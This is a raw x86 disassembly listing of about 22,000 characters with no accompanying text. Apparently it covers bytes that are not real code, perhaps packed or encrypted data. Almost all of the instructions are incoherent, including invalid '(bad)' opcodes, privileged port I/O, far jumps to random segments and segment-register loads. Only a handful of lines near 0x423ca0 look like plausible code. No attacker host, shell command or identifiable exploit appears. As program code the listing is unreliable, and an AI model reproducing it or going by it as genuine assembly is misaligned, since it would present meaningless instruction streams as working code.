  423aec:	sbb    al,0xe7
  423aee:	mov    dh,0x1
  423af0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423af1:	aaa    
  423af2:	ror    DWORD PTR [ebx+0x6b],0x40
  423af6:	imul   edx,DWORD PTR [ebx+0x3320fde1],0xffffffa3
  423afd:	sbb    eax,0xef6ed316
  423b02:	sub    dh,BYTE PTR [ebx+0x26c9845d]
  423b08:	int3   
  423b09:	out    0x79,eax
  423b0b:	push   0x6e
  423b0d:	sub    DWORD PTR [ecx+0x1d],eax
  423b10:	dec    ebp
  423b11:	xlat   BYTE PTR ds:[ebx]
  423b12:	mov    ch,0x4a
  423b14:	mov    dl,0x4d
  423b16:	xchg   edi,eax
  423b17:	std    
  423b18:	in     al,dx
  423b19:	aam    0x4a
  423b1b:	sbb    al,0x8c
  423b1d:	stos   BYTE PTR es:[edi],al
  423b1e:	lock xchg ebp,eax
  423b20:	in     eax,dx
  423b21:	jnp    0x423aad
  423b23:	pop    eax
  423b24:	div    ecx
  423b26:	inc    ebx
  423b27:	mov    WORD PTR [edi-0x3b72ba5b],ss
  423b2d:	sub    edx,DWORD PTR [ebx+0x4e]
  423b30:	xchg   ecx,eax
  423b31:	pop    es
  423b32:	mov    esp,0x3733bc5e
  423b37:	ret    0xcf01
  423b3a:	dec    edx
  423b3b:	add    eax,0x85c357b8
  423b40:	pop    ds
  423b41:	adc    BYTE PTR [eax-0x44],dl
  423b44:	loope  0x423ac8
  423b46:	js     0x423b7d
  423b48:	arpl   WORD PTR [ebx+0x27649377],si
  423b4e:	(bad)  
  423b4f:	cld    
  423b50:	xchg   esi,eax
  423b51:	call   0x38703eaa
  423b56:	sbb    ebp,DWORD PTR [edx+0x9d9588c]
  423b5c:	xlat   BYTE PTR ds:[ebx]
  423b5d:	mov    ebp,0x7c07aabd
  423b62:	mov    al,ds:0xf0854e46
  423b67:	xchg   ecx,eax
  423b68:	cwde   
  423b69:	xlat   BYTE PTR ds:[ebx]
  423b6a:	inc    esp
  423b6b:	dec    esi
  423b6c:	inc    edx
  423b6d:	sub    al,0x32
  423b6f:	stos   DWORD PTR es:[edi],eax
  423b70:	inc    eax
  423b71:	outs   dx,DWORD PTR ds:[esi]
  423b72:	pusha  
  423b73:	push   cs
  423b74:	jns    0x423b24
  423b76:	sahf   
  423b77:	dec    esi
  423b79:	ret    
  423b7a:	lods   eax,DWORD PTR ds:[esi]
  423b7b:	outs   dx,BYTE PTR ds:[esi]
  423b7c:	fcmovu st,st(0)
  423b7e:	or     al,0x66
  423b80:	(bad)  
  423b81:	(bad)  
  423b82:	idiv   DWORD PTR ds:0x4ce55e63
  423b88:	add    esp,DWORD PTR [ebp+0x63]
  423b8b:	add    BYTE PTR [ebp-0x3fae7f42],bl
  423b91:	xchg   DWORD PTR [ebx],eax
  423b93:	jbe    0x423c14
  423b95:	popf   
  423b96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b97:	js     0x423b77
  423b99:	push   edx
  423b9a:	mov    esi,0x8f12f9aa
  423b9f:	sbb    al,0x2
  423ba1:	test   al,0x50
  423ba3:	jmp    0x423b59
  423ba5:	scas   al,BYTE PTR es:[edi]
  423ba6:	xor    DWORD PTR [edi+ebx*2+0xf68f9d],ecx
  423bad:	js     0x423c0b
  423baf:	(bad)  
  423bb1:	xchg   ecx,eax
  423bb2:	inc    esi
  423bb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423bb4:	dec    edi
  423bb5:	call   0xd1510ee5
  423bba:	inc    esi
  423bbb:	paddq  mm6,QWORD PTR [esp+edx*4+0x39]
  423bc0:	cli    
  423bc1:	cmp    esp,ebp
  423bc3:	mov    bh,0x47
  423bc5:	sbb    BYTE PTR [edx],bh
  423bc7:	inc    ecx
  423bc8:	sub    cl,BYTE PTR [ebx-0x2d612b9c]
  423bce:	pop    ds
  423bcf:	jecxz  0x423b91
  423bd1:	jbe    0x423b54
  423bd3:	int    0xdd
  423bd5:	add    BYTE PTR [ecx+esi*1+0x28],ah
  423bd9:	mov    bh,0x2a
  423bdb:	leave  
  423bdc:	xchg   ebx,eax
  423bdd:	sbb    ebp,DWORD PTR [edi]
  423bdf:	pop    ebp
  423be0:	dec    ebx
  423be1:	fcomp  QWORD PTR es:[edx+0x4369add1]
  423be8:	shl    DWORD PTR [ebx],cl
  423bea:	mov    ds:0xb60d631c,eax
  423bef:	pop    ss
  423bf0:	jbe    0x423c29
  423bf2:	(bad)  
  423bf3:	imul   ecx,DWORD PTR [ecx+0x7a],0xffffffac
  423bf7:	mov    esp,0x19ea9c5b
  423bfc:	xlat   BYTE PTR ds:[ebx]
  423bfd:	jae    0x423c73
  423bff:	jmp    0x423bad
  423c01:	sti    
  423c02:	push   es
  423c03:	adc    eax,0x9a44b671
  423c08:	mov    ?,WORD PTR [ebp-0x57d38a51]
  423c0e:	xchg   BYTE PTR [eax+0x4d],dl
  423c11:	int    0xc3
  423c13:	jecxz  0x423c59
  423c15:	xor    edx,ebp
  423c17:	retf   
  423c18:	pop    edx
  423c19:	mov    WORD PTR [ecx],fs
  423c1b:	mov    bh,0x33
  423c1d:	xchg   cl,dh
  423c1f:	(bad)  
  423c20:	cmc    
  423c21:	push   edx
  423c22:	aam    0xf
  423c24:	sahf   
  423c25:	adc    esi,DWORD PTR [ebx-0x26]
  423c28:	or     ebx,esp
  423c2a:	dec    ebp
  423c2b:	pop    eax
  423c2c:	pop    es
  423c2d:	adc    eax,0x5b650665
  423c32:	add    eax,0xdbc48ef0
  423c37:	ss or  eax,0xc8f48912
  423c3d:	jmp    0x423cae
  423c3f:	mov    dh,0xae
  423c41:	add    ax,0xc726
  423c45:	or     bh,cl
  423c47:	add    BYTE PTR [ebx-0x3b7171f5],dl
  423c4d:	loopne 0x423c4c
  423c4f:	push   eax
  423c50:	mov    ds:0x6d1becb3,eax
  423c55:	test   ah,cl
  423c57:	xchg   edx,eax
  423c58:	fs push cs
  423c5a:	xchg   ebx,eax
  423c5b:	add    ecx,DWORD PTR [edi+0x75297bc9]
  423c61:	mov    WORD PTR [ecx],?
  423c63:	xor    BYTE PTR [esi-0x1],al
  423c66:	mov    bl,0x6
  423c68:	loope  0x423bf3
  423c6a:	ficom  DWORD PTR [ebx-0x7f]
  423c6d:	fcmovu st,st(3)
  423c6f:	fisub  WORD PTR [ebx+0x2fe207ed]
  423c75:	mov    dl,0xff
  423c77:	ror    DWORD PTR [ecx+edx*2-0x6d5a596f],cl
  423c7e:	sub    BYTE PTR [eax+0x75],bl
  423c81:	xchg   ebx,eax
  423c82:	mov    dh,BYTE PTR [ebp+0x1c]
  423c85:	jae    0x423cc8
  423c87:	jb     0x423ce3
  423c89:	push   eax
  423c8a:	jns    0x423c8a
  423c8c:	jbe    0x423cb0
  423c8e:	dec    esp
  423c8f:	xor    ecx,DWORD PTR [ecx]
  423c91:	les    edx,FWORD PTR [ecx]
  423c93:	sbb    DWORD PTR [edi-0x76],0x35
  423c97:	ror    DWORD PTR [edi],cl
  423c99:	test   bl,ah
  423c9b:	push   cs
  423c9c:	add    BYTE PTR [eax],al
  423c9e:	jmp    0x423cae
  423ca3:	sub    edi,DWORD PTR ds:0x42a3a6
  423ca9:	mov    esi,0x3272ef
  423cae:	mov    eax,DWORD PTR [ebp-0x4]
  423cb1:	mov    edi,DWORD PTR [ebp-0x8]
  423cb4:	xor    edi,edx
  423cb6:	jmp    0x424b21
  423cbb:	sbb    DWORD PTR [esi+0x7],esp
  423cbe:	stc    
  423cbf:	sti    
  423cc0:	xchg   ebx,eax
  423cc1:	xchg   DWORD PTR [esi-0x7e0d41b7],eax
  423cc7:	les    ebx,FWORD PTR [eax+0x4]
  423cca:	xchg   esp,eax
  423ccb:	out    dx,al
  423ccc:	mov    bh,BYTE PTR [ecx+0x7a]
  423ccf:	xor    al,0x74
  423cd1:	jp     0x423d4d
  423cd3:	dec    eax
  423cd4:	fsub   QWORD PTR [edx+0x19238234]
  423cda:	sub    dh,ch
  423cdc:	bound  edi,QWORD PTR [esi+0xd]
  423cdf:	adc    ah,BYTE PTR [edx+0x4a]
  423ce2:	pop    ebx
  423ce3:	aaa    
  423ce4:	xchg   edi,eax
  423ce5:	scas   eax,DWORD PTR es:[edi]
  423ce6:	cmp    bh,bl
  423ce8:	outs   dx,DWORD PTR ds:[esi]
  423ce9:	mov    al,0x4
  423ceb:	(bad)  
  423cee:	add    al,0xaa
  423cf0:	mov    al,0x8
  423cf2:	jne    0x423d09
  423cf4:	fisubr WORD PTR [edi+0x16]
  423cf7:	cdq    
  423cf8:	sbb    eax,0x7f9ae0bb
  423cfd:	pmulhw mm0,QWORD PTR [esi]
  423d00:	mov    dl,0x26
  423d02:	fsubrp st(5),st
  423d04:	push   edi
  423d05:	leave  
  423d06:	jb     0x423d59
  423d08:	mov    ebx,0x8354ce40
  423d0d:	push   ebx
  423d0e:	and    dh,ah
  423d10:	jle    0x423d09
  423d12:	jp     0x423cf8
  423d14:	mov    ecx,0x6a17d2cb
  423d19:	gs ror bl,cl
  423d1c:	aad    0xeb
  423d1e:	sbb    edx,DWORD PTR [edi]
  423d20:	dec    ebx
  423d21:	jne    0x423d25
  423d23:	mov    edx,ss
  423d25:	sbb    edx,DWORD PTR [ecx+edi*2+0x27]
  423d29:	cmp    DWORD PTR [eax+0x6ba56b1e],ebp
  423d2f:	sbb    eax,0x96fa3d1a
  423d34:	add    eax,0xd468769a
  423d39:	and    al,0x43
  423d3b:	test   eax,0x802791e5
  423d40:	add    BYTE PTR [bx-0x6cd0],al
  423d45:	fdiv   DWORD PTR [eax+esi*2+0x4d04eade]
  423d4c:	and    al,0x7f
  423d4e:	aad    0x35
  423d50:	sub    edi,eax
  423d52:	xchg   edx,eax
  423d53:	dec    ebp
  423d54:	jl     0x423d5d
  423d56:	lea    edx,[edi+0xb8b67ec]
  423d5c:	inc    ebp
  423d5d:	jmp    0x42f9e36b
  423d62:	mov    cs,ebx
  423d64:	stc    
  423d65:	sub    al,BYTE PTR [eax]
  423d67:	jno    0x423d33
  423d69:	push   0xffffffb8
  423d6b:	mov    dh,BYTE PTR [ebp+0x104f078d]
  423d71:	push   ss
  423d72:	imul   BYTE PTR [ecx+0x1a]
  423d75:	inc    edx
  423d76:	jo     0x423cf9
  423d78:	dec    ebp
  423d79:	fcomp  DWORD PTR [ebx+0x65]
  423d7c:	sub    ch,bl
  423d7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d7f:	mov    al,0xdf
  423d81:	mov    esp,0x831cb316
  423d86:	xlat   BYTE PTR ds:[ebx]
  423d87:	dec    ecx
  423d88:	add    al,0x13
  423d8a:	jle    0x423d1a
  423d8c:	adc    ecx,DWORD PTR [eax+0x198b6c2a]
  423d92:	cmp    ch,BYTE PTR [edx+0x3316abee]
  423d98:	or     BYTE PTR [ebp-0x51e32461],ah
  423d9e:	pop    eax
  423d9f:	sub    al,0x4
  423da1:	jne    0x423d8f
  423da3:	and    al,0x2b
  423da5:	sahf   
  423da6:	add    BYTE PTR [edi+0x7d],cl
  423da9:	mov    eax,0x103d44af
  423dae:	fld    DWORD PTR [edi+0x42]
  423db1:	repnz mov esi,0xab2d0031
  423db8:	jl     0x423d9d
  423dba:	daa    
  423dbb:	jmp    0x92ab:0x3c7f5741
  423dc2:	call   0xb03e:0x706fa7ca
  423dc9:	dec    esi
  423dca:	or     eax,0x9407b5cb
  423dcf:	ficom  DWORD PTR [esi-0x23]
  423dd2:	das    
  423dd3:	jge    0x423dfe
  423dd5:	and    eax,0x9bacd89e
  423dda:	repz push eax
  423ddc:	pop    ebp
  423ddd:	and    DWORD PTR [eax-0x1e],edx
  423de0:	add    al,BYTE PTR [esi+0x39501657]
  423de6:	xchg   ecx,eax
  423de7:	dec    edi
  423de8:	adc    esp,0x12283dbf
  423dee:	fild   QWORD PTR [ecx-0x59120ad7]
  423df4:	adc    bl,cl
  423df6:	stos   DWORD PTR es:[edi],eax
  423df7:	adc    eax,0x9843cc73
  423dfc:	shl    DWORD PTR [ecx],0x67
  423dff:	fldenv [esi-0x7f]
  423e02:	cmp    eax,0x80e575b
  423e07:	aas    
  423e08:	sub    ah,BYTE PTR [edx-0x70]
  423e0b:	xchg   ebp,eax
  423e0c:	cmp    DWORD PTR [ebx+0x37],edx
  423e0f:	shl    dl,0x72
  423e12:	push   ecx
  423e13:	fistp  WORD PTR [edx-0x4583c14d]
  423e19:	cs test bl,dh
  423e1c:	pop    esi
  423e1d:	aad    0x4a
  423e1f:	sahf   
  423e20:	mov    ebp,gs
  423e22:	mov    ebx,0x3005c155
  423e27:	pop    edx
  423e28:	cs addr16 in eax,dx
  423e2b:	int    0xcb
  423e2d:	data16 arpl WORD PTR [edx-0x1a],cx
  423e31:	lock (bad) 
  423e34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e35:	out    0xb0,al
  423e37:	jbe    0x423dce
  423e39:	push   eax
  423e3a:	mov    bh,0x6d
  423e3c:	stc    
  423e3d:	sbb    BYTE PTR [ebx+0x47],bh
  423e40:	scas   eax,DWORD PTR es:[edi]
  423e41:	in     eax,0x38
  423e43:	stos   DWORD PTR es:[edi],eax
  423e44:	adc    bl,bl
  423e46:	mov    ecx,0xb3e2d953
  423e4b:	jmp    DWORD PTR [esi+0x2c6118a]
  423e51:	or     edi,edx
  423e53:	in     al,0xec
  423e55:	push   ecx
  423e56:	mov    esp,0xb0350345
  423e5b:	inc    ecx
  423e5c:	test   DWORD PTR [edi+ebx*2-0x198d61f0],0xb5de29c1
  423e67:	(bad)  
  423e68:	(bad)  
  423e69:	stc    
  423e6a:	cmp    eax,0xa7ba72b1
  423e6f:	(bad)  
  423e70:	xchg   ebp,eax
  423e71:	sub    ecx,DWORD PTR [edx+0x334d6e77]
  423e77:	ficom  WORD PTR [ebx-0x3b]
  423e7a:	sbb    DWORD PTR [edx],ebp
  423e7c:	jns    0x423ebb
  423e7e:	push   edx
  423e7f:	mov    edi,0xae577a49
  423e84:	cs ss mov ah,0x7b
  423e88:	nop
  423e89:	test   BYTE PTR [ecx-0x6ad68517],bl
  423e8f:	aas    
  423e90:	fnstenv [ebp+0x76]
  423e93:	sar    BYTE PTR [edi],0xe6
  423e96:	dec    eax
  423e97:	push   ecx
  423e98:	mov    edi,DWORD PTR [edi]
  423e9a:	or     eax,0x5b063a0b
  423e9f:	(bad)  
  423ea0:	xchg   edi,eax
  423ea1:	imul   bp,WORD PTR [esi+0x23],0xff9e
  423ea6:	inc    esi
  423ea7:	push   ebx
  423ea8:	inc    esi
  423ea9:	push   cs
  423eaa:	mov    edx,0x97178f22
  423eaf:	mov    al,ds:0xa4cc40a1
  423eb4:	test   esp,esi
  423eb6:	jmp    0x423e5d
  423eb8:	dec    edx
  423eb9:	mov    ch,0xb7
  423ebb:	daa    
  423ebc:	xor    ebx,DWORD PTR ds:0xffed50b6
  423ec2:	push   ebx
  423ec3:	and    eax,0xa80c40db
  423ec8:	push   0xe327e4d
  423ecd:	inc    edi
  423ece:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ecf:	push   edx
  423ed0:	mov    dh,bh
  423ed2:	repnz pushf 
  423ed4:	and    esp,eax
  423ed6:	sbb    BYTE PTR [ebp-0x30],cl
  423ed9:	cmp    ebx,ebx
  423edb:	xor    ebx,DWORD PTR [eax-0x6c]
  423ede:	fdivr  QWORD PTR [eax]
  423ee0:	(bad)  
  423ee1:	fld    DWORD PTR [ecx-0x6abbd68c]
  423ee7:	push   ds
  423ee8:	inc    ebp
  423ee9:	mov    BYTE PTR ss:[ebx+0x73],bl
  423eed:	mov    dl,BYTE PTR [esi+0x66658859]
  423ef3:	into   
  423ef4:	xchg   DWORD PTR ds:0xfa826e29,eax
  423efa:	call   0xb7f:0xac0d4a00
  423f01:	jmp    0x5356:0x1179d66d
  423f08:	mov    esi,0x406952dc
  423f0d:	xlat   BYTE PTR ds:[ebx]
  423f0e:	xchg   ebp,eax
  423f0f:	out    0x29,eax
  423f11:	or     eax,0x383d3a6
  423f16:	mov    edi,0xc636fa9b
  423f1b:	lods   al,BYTE PTR ds:[esi]
  423f1c:	scas   eax,DWORD PTR es:[edi]
  423f1d:	and    ah,BYTE PTR [ecx*4-0x1d7e803d]
  423f24:	push   ebp
  423f25:	sub    al,0x66
  423f27:	stos   DWORD PTR es:[edi],eax
  423f28:	jmp    0x5768:0x4b191097
  423f2f:	imul   edx,DWORD PTR [esi],0x7c
  423f32:	xlat   BYTE PTR ds:[ebx]
  423f33:	loop   0x423f84
  423f35:	lods   eax,DWORD PTR ds:[esi]
  423f36:	pop    es
  423f37:	mov    ds:0x280674f2,eax
  423f3c:	mov    ecx,0xbedd34ec
  423f41:	mov    al,ds:0x3500c06f
  423f46:	lds    ebx,FWORD PTR [eax]
  423f48:	add    DWORD PTR [ebp+0x6803450b],ebp
  423f4e:	cmp    esi,DWORD PTR [edi+esi*1]
  423f51:	xor    BYTE PTR [eax+0xc],ch
  423f54:	mov    ebp,0x67a3afed
  423f59:	test   DWORD PTR [edx],0x35c813d2
  423f5f:	je     0x423f75
  423f61:	and    dl,BYTE PTR [edx-0x4c]
  423f64:	sub    DWORD PTR [edi-0x59e2676b],0xffffffd3
  423f6b:	mov    BYTE PTR [ecx+eiz*2-0x79],0x32
  423f70:	xchg   edi,eax
  423f71:	mov    esp,0xdf770137
  423f76:	in     al,0x60
  423f78:	dec    edx
  423f79:	jecxz  0x423f4e
  423f7b:	mov    ecx,0x7b02de1a
  423f80:	push   0x5e1cb4ba
  423f85:	pop    ebx
  423f86:	sti    
  423f87:	mov    esi,0x60d4dcd4
  423f8c:	aas    
  423f8d:	xchg   esi,eax
  423f8e:	das    
  423f8f:	add    al,0xfe
  423f91:	lea    ecx,[eax]
  423f93:	jmp    0x27a217b1
  423f98:	mov    ds:0x34baf07a,eax
  423f9d:	retf   0xc1ef
  423fa0:	push   cs
  423fa1:	jle    0x423fd9
  423fa3:	xor    DWORD PTR [eax+0xb121003],ebx
  423fa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423faa:	or     cl,bl
  423fac:	hlt    
  423fad:	pop    ss
  423fae:	std    
  423faf:	dec    eax
  423fb0:	ins    DWORD PTR es:[edi],dx
  423fb1:	in     eax,0xda
  423fb3:	jmp    0x423fc8
  423fb5:	fxch   st(5)
  423fb7:	repz aaa 
  423fb9:	shr    esi,0xb
  423fbc:	out    0x5b,eax
  423fbe:	inc    ebp
  423fbf:	pop    ebx
  423fc0:	scas   eax,DWORD PTR es:[edi]
  423fc1:	out    dx,eax
  423fc2:	jo     0x424016
  423fc4:	and    al,BYTE PTR [edx-0x63]
  423fc7:	bound  esp,QWORD PTR [edx]
  423fc9:	inc    edi
  423fca:	xchg   esi,eax
  423fcb:	retf   0x5a06
  423fce:	and    ah,BYTE PTR [eax-0x72ad88ba]
  423fd4:	pop    ebx
  423fd5:	mov    al,0x7e
  423fd7:	addr16 push esi
  423fd9:	xor    BYTE PTR [eax],ah
  423fdb:	pushf  
  423fdc:	dec    esi
  423fdd:	out    0x11,eax
  423fdf:	push   esi
  423fe0:	pusha  
  423fe1:	or     eax,0x478ee842
  423fe6:	jle    0x423fd5
  423fe8:	adc    ch,cl
  423fea:	sbb    DWORD PTR [edi+eax*1+0xe],ebp
  423fee:	rol    DWORD PTR [edi+0x7ffe86a8],0xf5
  423ff5:	scas   al,BYTE PTR es:[edi]
  423ff6:	aam    0x3c
  423ff8:	fsubrp st(5),st
  423ffa:	adc    eax,0xdfa54f59
  423fff:	sbb    al,0xbc
  424001:	loop   0x423fe8
  424003:	pop    ss
  424004:	pop    es
  424005:	stos   BYTE PTR es:[edi],al
  424006:	cmp    eax,0xa237e0d2
  42400b:	add    dh,BYTE PTR [esi+0x7776ca10]
  424011:	mov    es,WORD PTR [edi+0x8]
  424014:	int3   
  424015:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424016:	lahf   
  424017:	imul   esi,ebx,0xf4312b6
  42401d:	aad    0x9c
  42401f:	bound  edi,QWORD PTR [ecx-0x9]
  424022:	test   eax,0x44b6e2d5
  424027:	and    al,0x4e
  424029:	xor    DWORD PTR [edi+0x318f44f7],ebx
  42402f:	cmp    ah,BYTE PTR [edi+edi*4]
  424032:	inc    edi
  424033:	adc    BYTE PTR [edi-0x39],cl
  424036:	sub    al,0xe3
  424038:	mov    eax,0x34bdcae6
  42403d:	hlt    
  42403e:	popa   
  42403f:	scas   eax,DWORD PTR es:[edi]
  424040:	dec    esi
  424041:	sbb    edi,DWORD PTR [eax+0x23]
  424044:	cmp    BYTE PTR [esi+edi*8+0x62],0xed
  424049:	in     al,dx
  42404a:	jle    0x424005
  42404c:	fldcw  WORD PTR [ebx-0x41]
  42404f:	mov    cl,0x82
  424051:	fs in  eax,0x43
  424054:	icebp  
  424055:	pop    edi
  424056:	aas    
  424057:	mov    bl,cl
  424059:	and    BYTE PTR [esi],0xd9
  42405c:	in     eax,0xfd
  42405e:	push   cs
  42405f:	xchg   DWORD PTR [esi-0x10754797],edx
  424065:	mov    ebx,0x4029c40e
  42406a:	add    BYTE PTR ds:0x58d2ec1e,al
  424070:	call   0xee5b3166
  424075:	jmp    0x3331:0x4c1d244c
  42407c:	adc    ecx,DWORD PTR [edx-0x68]
  42407f:	mov    edi,0x79ff7513
  424084:	loop   0x4240ba
  424086:	jl     0x4240f3
  424088:	cmp    BYTE PTR [eax+0x34],dh
  42408b:	sub    BYTE PTR [edx-0x75],cl
  42408e:	pop    esp
  42408f:	outs   dx,DWORD PTR ds:[esi]
  424090:	lods   eax,DWORD PTR ds:[esi]
  424091:	mov    ch,0xfc
  424093:	les    eax,FWORD PTR [edi+ecx*8-0x2c773b87]
  42409a:	dec    edi
  42409b:	add    BYTE PTR [edi+0x512ab5f9],bl
  4240a1:	cmp    edx,DWORD PTR [ecx+0x37b2913f]
  4240a7:	mov    ss,WORD PTR [esi-0x41fd2f6e]
  4240ad:	iret   
  4240ae:	xchg   ebp,eax
  4240af:	sub    BYTE PTR [eax+ecx*1+0x1f30b2da],dh
  4240b6:	xchg   eax,eax
  4240b8:	pusha  
  4240b9:	repnz iret 
  4240bb:	clc    
  4240bc:	fsub   QWORD PTR [ecx]
  4240be:	js     0x424077
  4240c0:	in     al,0x82
  4240c2:	mov    ds:0xb28ad7ca,eax
  4240c7:	daa    
  4240c8:	push   edx
  4240c9:	sub    al,0xc5
  4240cb:	cmp    dh,BYTE PTR [eax]
  4240cd:	mov    dh,BYTE PTR [edx+0x1c4a91ad]
  4240d3:	imul   edx,DWORD PTR [esp+ecx*8-0x400ecdce],0xffffff94
  4240db:	mov    eax,0x25dc537c
  4240e0:	iret   
  4240e1:	xor    eax,0xb966d9ba
  4240e6:	push   0xc327cca9
  4240eb:	call   0x82846523
  4240f0:	fcomip st,st(1)
  4240f2:	hlt    
  4240f3:	les    esi,FWORD PTR [edx+0x4cf389e7]
  4240f9:	jno    0x42412f
  4240fb:	sbb    dh,BYTE PTR ds:0xb4c81beb
  424101:	scas   al,BYTE PTR es:[edi]
  424102:	mov    ds:0x4df8fa69,eax
  424107:	lock inc ebx
  424109:	jmp    0x424170
  42410b:	mov    bh,0xdb
  42410d:	scas   al,BYTE PTR es:[edi]
  42410e:	mov    ch,0xee
  424110:	popa   
  424111:	or     edi,edx
  424113:	sbb    DWORD PTR es:[ebp-0x11],0xe0ad84ae
  42411b:	(bad)  
  42411c:	jmp    0xca22e44e
  424121:	pushf  
  424122:	(bad)  
  424123:	xor    edi,DWORD PTR ds:0x6ee9d6d0
  424129:	push   eax
  42412a:	popa   
  42412b:	gs pop ss
  42412d:	dec    esi
  42412e:	xchg   ebx,eax
  42412f:	iret   
  424130:	mov    ch,0xe1
  424132:	(bad)  
  424133:	cmp    BYTE PTR [eax],dl
  424135:	inc    ebx
  424136:	mov    ch,0x47
  424138:	popa   
  424139:	aaa    
  42413a:	aad    0x27
  42413c:	gs adc al,0x4f
  42413f:	xor    BYTE PTR [edx-0x41a254ee],al
  424145:	fcmovne st,st(5)
  424147:	stos   BYTE PTR es:[edi],al
  424148:	repz jg 0x424175
  42414b:	jns    0x4240fb
  42414d:	mov    eax,ds:0x501c77f0
  424152:	daa    
  424153:	adc    ecx,eax
  424155:	xor    eax,0x5b492d96
  42415a:	pop    ebp
  42415b:	mov    al,0xe9
  42415d:	mov    esi,0xc7230b5f
  424162:	out    0x9f,al
  424164:	(bad)  
  424166:	data16 xor WORD PTR [eax+0x46],bx
  42416b:	mov    edx,0x1dc37a8b
  424170:	push   0xffffff89
  424172:	dec    edx
  424173:	jae    0x424116
  424175:	sti    
  424176:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424177:	dec    edi
  424178:	push   0xc378dd69
  42417d:	jno    0x42419d
  42417f:	or     bh,BYTE PTR [ebx-0x1d888b27]
  424185:	std    
  424186:	pop    edx
  424187:	out    0x5,al
  424189:	mov    ah,0xba
  42418b:	inc    ecx
  42418c:	fs (bad) 
  42418e:	push   edi
  42418f:	sbb    ebx,esp
  424191:	sbb    esp,DWORD PTR [esi+0x12]
  424194:	mov    DWORD PTR [edi+edi*1],ecx
  424197:	cmp    al,0x99
  424199:	cmp    ebx,DWORD PTR [edi+eax*1]
  42419c:	int3   
  42419d:	mov    eax,0xb83f9859
  4241a2:	fcomp  DWORD PTR [esp+ecx*8+0x2ecdb8f1]
  4241a9:	and    edi,eax
  4241ab:	(bad)  
  4241ac:	bound  ecx,QWORD PTR [esi+eiz*4]
  4241af:	cmp    ebp,DWORD PTR [ecx-0x6c]
  4241b2:	adc    al,0x86
  4241b4:	fist   DWORD PTR [ebp-0xb]
  4241b7:	je     0x424142
  4241b9:	pop    esi
  4241ba:	das    
  4241bb:	das    
  4241bc:	adc    cl,ch
  4241be:	scas   al,BYTE PTR es:[edi]
  4241bf:	jle    0x424172
  4241c1:	stos   BYTE PTR es:[edi],al
  4241c2:	xor    eax,0x59461aed
  4241c7:	jl     0x4241d7
  4241c9:	jmp    0xb40:0x47ac0c75
  4241d0:	les    ebx,FWORD PTR [edi-0x3c895a57]
  4241d6:	pop    ds
  4241d7:	arpl   WORD PTR [eax],bp
  4241d9:	sar    BYTE PTR [ebx-0x77],0xa5
  4241dd:	addr16 sub al,0x45
  4241e0:	cld    
  4241e1:	in     eax,0x80
  4241e3:	jp     0x42422d
  4241e5:	push   edx
  4241e6:	jb     0x42418b
  4241e8:	mov    dh,0x93
  4241ea:	jmp    0x4241ba
  4241ec:	loop   0x4241b1
  4241ee:	adc    edx,0x15
  4241f1:	out    dx,eax
  4241f2:	mov    esi,0x26156369
  4241f7:	push   0x2bdfb43a
  4241fc:	ret    
  4241fd:	and    esi,DWORD PTR [ecx-0x7dcd295b]
  424203:	or     BYTE PTR [esi],al
  424205:	add    al,0x43
  424207:	adc    ah,BYTE PTR [edx]
  424209:	mov    bh,0xa8
  42420b:	aam    0x14
  42420d:	int    0x20
  42420f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424210:	stos   BYTE PTR es:[edi],al
  424211:	jp     0x4241cc
  424213:	gs xchg ebx,eax
  424215:	test   DWORD PTR [eax-0x7f7c7c3f],esi
  42421b:	pop    ecx
  42421c:	mov    ebp,0xc2661907
  424221:	and    DWORD PTR [ebx+edi*2+0x36],ebx
  424225:	and    bh,BYTE PTR ds:0xef208e91
  42422b:	retf   0x6fce
  42422e:	sbb    BYTE PTR [eax],bl
  424230:	adc    esi,edi
  424232:	ins    BYTE PTR es:[edi],dx
  424233:	(bad)  
  424234:	jbe    0x4241ba
  424236:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424237:	mov    edi,cs
  424239:	outs   dx,BYTE PTR ds:[esi]
  42423a:	pop    es
  42423b:	je     0x42427f
  42423d:	stc    
  42423e:	xchg   edi,ebp
  424240:	cli    
  424241:	sbb    DWORD PTR [edx-0x1c6bc74d],edx
  424247:	pusha  
  424248:	or     al,bl
  42424a:	push   es
  42424b:	fldenv [ecx+ecx*4-0x280b3975]
  424252:	dec    eax
  424253:	scas   al,BYTE PTR es:[edi]
  424254:	out    dx,eax
  424255:	imul   edi,esp,0xbb93bb19
  42425b:	es inc edi
  42425d:	inc    eax
  42425e:	fwait
  42425f:	lds    ecx,FWORD PTR [ebp+0x58]
  424262:	fcomp  st(4)
  424264:	sub    al,0xc8
  424266:	ins    DWORD PTR es:[edi],dx
  424267:	cmp    BYTE PTR [ebx+0x34],ah
  42426a:	cwde   
  42426b:	pushf  
  42426c:	arpl   WORD PTR [ecx+esi*8],cx
  42426f:	ret    
  424270:	fiadd  DWORD PTR [ebx-0x34]
  424273:	jl     0x4242dd
  424275:	fiadd  DWORD PTR [esi]
  424277:	adc    eax,0x71ab265e
  42427c:	xor    eax,0xd2583b9f
  424281:	and    cl,dh
  424283:	js     0x424277
  424285:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424286:	or     DWORD PTR [ebp+0x1a],0x2d8d2428
  42428d:	or     al,0x4f
  42428f:	xchg   edx,eax
  424290:	xchg   DWORD PTR ds:0xdbc8b329,edx
  424296:	retf   0x4de3
  424299:	pushf  
  42429a:	je     0x42424d
  42429c:	fstp   QWORD PTR [bx]
  42429f:	sub    eax,0xf6a03e7b
  4242a4:	xchg   esi,eax
  4242a5:	mov    dh,0xf7
  4242a7:	xor    BYTE PTR [edx],al
  4242a9:	sbb    esp,ebp
  4242ab:	into   
  4242ac:	or     ch,BYTE PTR [edx-0x36]
  4242af:	mov    DWORD PTR [eax-0x33],ebx
  4242b2:	mov    ebx,0x1c63b89
  4242b7:	imul   ebp,DWORD PTR [eax-0x7c],0xffffff9a
  4242bb:	imul   eax,DWORD PTR [eax],0xffffff91
